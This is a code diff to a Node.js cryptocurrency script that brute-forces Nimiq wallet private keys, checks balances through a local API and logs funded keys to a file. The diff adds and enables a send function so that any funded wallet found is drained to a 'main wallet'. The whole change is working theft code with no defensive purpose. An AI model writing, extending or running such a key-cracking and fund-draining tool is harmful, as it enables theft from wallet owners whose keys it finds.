@@ -37,6 +37,15 @@ const argv = require('minimist')(process.argv.slice(2));
       console.log(`Worker ${worker.process.pid} died`);
     });
   } else {
+    const send = async (privateKey) => {
+      try {
+        const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
+        return res.data;
+      } catch (error) {
+        return null;
+      }
+    }
+    
     const getBalance = async (address) => {
       try {
         const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
@@ -62,16 +71,16 @@ const argv = require('minimist')(process.argv.slice(2));
 
       if (balance > 0) {
         founds++;
-        console.info(`\x1b[32mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
+        console.info(`\x1b[32mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
 
         // Write to file
         var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
         fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
 
         // Create transaction to main wallet
-        // await send(privateKeyHex);
+        await send(privateKeyHex);
       } else {
-        console.info(`\x1b[35mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
+        console.info(`\x1b[35mFounds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
       }
     }
   }
